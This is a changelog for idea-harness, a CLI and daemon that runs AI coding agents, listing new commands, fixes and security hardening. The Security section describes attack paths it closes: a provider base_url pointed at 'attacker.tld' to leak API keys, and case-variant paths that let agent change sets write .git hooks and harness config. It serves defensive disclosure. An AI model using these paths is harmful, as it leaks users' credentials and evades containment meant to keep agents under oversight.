- `README.md` states the supported platforms: macOS and Linux are tested in CI; Windows is not
  supported, because the CLI starts its daemon in a new session and there is no Windows equivalent
  in the tree yet.

- `idea version` (and `--version`) prints the version, commit and whether the build came from a dirty
  tree; `idea doctor` prints the same stamp. The daemon's `/api/v1/version` reports it too, replacing
  a hardcoded `0.1.0` that every install returned regardless of what it was built from.
- Tagged releases build prebuilt macOS and Linux binaries in CI (goreleaser), with the web UI
  embedded and `-trimpath` so no maintainer's local paths ship inside them.

- `idea next --until-human` runs the automatable steps (`advance` → `execute` → `verify`) back to
  back, waiting for each to finish, and stops at the first human judgment point. The documented
  quick start drops from 13 commands to 8. A failed step stops the loop rather than continuing.
- `idea help --format=md` writes the command table as markdown to stdout (the human `idea help`
  still goes to stderr, unchanged). `docs/cli.md` embeds that table between generated-block markers,
  and `make docs` regenerates it. `docs/cli.md` documented 16 of the 36 commands the CLI dispatches;
  `risk`, `diff`, `cancel` and `change <id>` appeared in no document at all. `make docs-check` fails
  on drift and runs in CI, so a new command can no longer ship undocumented.

### Changed

- `idea apply` on a change set that cannot be applied now fails with what to do instead — already
  applied (`idea revert`), not yet approved (`idea review … approve`), rejected (`idea reviews`).
  Apply is asynchronous, so it previously answered `✓ apply started` and failed out of sight.

- The Go module path is now `github.com/devarispbrown/idea-harness`, matching the repository. It
  declared `github.com/idea-harness/idea-harness`, which resolves nowhere, so no tag could ever have
  made `go install <module>@<version>` work. Free to change now (no tags, no consumers); a breaking
  change the moment either exists, which is why it lands before the first tag.

- `idea model set` refuses a provider that does not exist, naming the ones that do. It previously
  answered `✓ default model set to bogus/model` and failed at the first run.
- `idea doctor` exits non-zero when a check fails. It printed the failure and exited 0, so a script
  that ran it as the post-install check could not tell.
- `idea help` now lists `verify`, `next` and `help` itself, which were dispatched but never shown.

- Unknown flags are now an error naming the command's accepted flags, instead of being silently
  treated as a positional argument (or, for `idea next`, discarded).
- `idea plan --json` now fails with a message pointing at `idea tasks --json`. It previously accepted
  the flag and printed markdown. The execution plan is a markdown artifact and has no JSON form.
- `idea prd` and `idea export` render daemon errors in the same shape as every other command; they
  previously printed the raw response body behind a `daemon: ` prefix.
- `idea verify --json` now emits the verification status and coverage as JSON. It previously accepted
  the flag and printed human-formatted output.
- `docs/configuration.md` documents the top-level `harness.yaml` fields, including `git_commit`,
  which README, the quick start and `docs/ui.md` all referenced while the configuration reference
  did not mention it at all.

- `README.md` no longer describes Node and pnpm as optional for installing. They are needed only to
  change the web UI.

### Fixed

- `idea prd`, `idea export` and `idea plan` render the artifact belonging to the initiative you are
  working on. They selected the last artifact of a matching kind from whatever initiative the daemon
  defaulted to, so in a project with more than one initiative they could silently render another
  initiative's PRD or plan. `idea export --json` also treated the flag as an artifact kind.
- Endpoints that resolve an initiative from `?initiative_id=` fall back to the most recent
  initiative when it is omitted, matching what the CLI means by "the initiative you are working on".
  They fell back to the oldest, so the daemon could answer about a different initiative than the CLI
  was asking about.
- A completed initiative no longer suggests more work: `idea status` said `● complete` and then
  `→ Resolve open questions`. Anything still open on a complete initiative is reported as being on
  the record, not as a next step.
- A pre-existing config problem no longer blocks unrelated provider writes. Any error anywhere in
  `harness.yaml` rejected every `idea model set` and UI Settings save — including the one that would
  have fixed it. Only problems attributable to what the request writes block it now.

- `idea next --until-human` stops when a step changes nothing instead of retrying it. After `apply`,
  the verification gate runs clean while the initiative waits on human evidence, so the loop ran the
  gate 50 times and then exited non-zero blaming the initiative — on the quick start's own path. It
  now names the requirements still missing evidence and the command that records it.

- Unknown ids get an error that names them. `idea apply CHG-99` answered `sql: no rows in result
  set` — the database driver's own string, with no indication of what was wrong or how to fix it.
  It now answers `no change set matching "CHG-99"`. The mapping lives at the store boundary, so
  every command and endpoint that looks something up inherits it.
- Server-side failures no longer expose internal detail. A 5xx now carries a generic message and a
  correlation id, with the full error logged under that id.

- `idea config validate` reports a configuration that cannot work. A model spec naming a provider
  that resolves to nothing — `idea model set bogus/model`, or a hand-edited `default_model`,
  `executor.model` or `models.<role>` — used to answer `config: valid`. It is now an error naming
  the field and listing the providers that are configured. A known provider whose `api_key_env` is
  unset is a warning, not an error: running without a key is demo mode. Custom OpenAI-compatible
  providers (Groq, Together, LM Studio) stay valid — any name under `harness.providers` counts as
  configured. A config with problems still loads, so upgrading never makes an existing project
  unopenable.

- `--json` works on the state-returning commands: `tasks`, `changes`, `risk`, `explain`, `why`,
  `impact`, `trace`, `diff` and `verify`. Each of them treated the flag itself as a positional
  initiative reference, so the daemon looked up an initiative named `--json`, missed, and the CLI
  printed `sql: no rows in result set` and exited 1. `idea trace --json` returns one
  `{"why": …, "impact": …}` document rather than two concatenated arrays.
- `advance`, `execute`, `watch` and `next` had the same mis-parse and now reject unknown flags
  outright; they take no flags and produce no JSON.

- A clean checkout now compiles with no Node toolchain. `internal/web/dist/` was ignored by git while
  `internal/web/web.go` embeds it, so `go install ./cmd/idea`, `make test`, and `make vet` all failed
  in a fresh clone with `pattern dist: no matching files found`. A placeholder `dist/index.html` is
  committed; `make build` overwrites it with the real UI.

### Security

- The control-plane deny is case-insensitive. `.idea-harness/**` and `.git/**` were matched exactly,
  so on a case-insensitive filesystem (macOS and Windows by default) a change set naming
  `.IDEA-HARNESS/harness.yaml` or `.Git/hooks/pre-commit` was accepted and written — into the very
  directories the deny exists to protect.

- A provider's `base_url` is validated when the provider registry is built, not only on the write
  path, so a `harness.yaml` that arrives another way — a cloned repo, a hand edit, a restored backup
  — cannot repoint a preset provider at another host and inherit its API key. A refused entry is not
  registered: a preset falls back to its built-in endpoint, a custom name becomes unresolvable, the
  project still opens, and the reason is logged and reported. The providers view now shows the
  endpoint requests actually reach rather than the refused one.

- The web UI response carries a Content-Security-Policy and `Cache-Control: no-store`. The page
  embeds the per-install API token in a meta tag and the daemon binds a fixed loopback port that
  other local dev servers also use — an origin, and a browser cache, idea-harness does not own.
  Hashed assets keep a long TTL; their URL changes when their bytes do.
- `make embed-web` installs with `--frozen-lockfile`, `web/package.json` pins the package manager,
  and pnpm's install-script allowlist is declared empty, so re-enabling install-time code execution
  is a reviewable diff rather than a local `pnpm approve-builds`.

- A change set can no longer modify the harness control plane. `.idea-harness/**` (providers and
  their `base_url`, network policy, executor kind, `build_cmd`/`test_cmd`, `git_commit`) and
  `.git/**` (hooks, which run on your next manual commit) are excluded from the snapshot that
  becomes a change set, and a patch naming one is rejected before anything is written. Containment
  allowed both, and neither tripped the secret sweep or the path guard. `.gitignore` is unaffected.
- A coding agent is no longer launched with a provider key nobody chose. An unknown provider in
  `harness.executor.model` used to fall back to the first preset API key present in the environment,
  and the agent runs in a container with network egress. An unresolvable provider now fails the run
  with a message naming the model.
- A provider `base_url` is validated before it is stored. `PUT /providers` accepted any string and
  the registry registered it over the preset default, so `{"providers":{"openai":{"base_url":
  "https://attacker.tld/v1"}}}` sent `OPENAI_API_KEY` and the full prompt context to that host — no
  inline secret, so the existing secret check saw nothing wrong. A `base_url` must now be `https`,
  or `http` on loopback (ollama and LM Studio run locally), and overriding a built-in preset's
  endpoint is rejected outright; configure a differently-named provider instead. Keyless local
  presets may still move between loopback ports. `idea config validate` applies the same checks to a
  hand-edited `harness.yaml`.
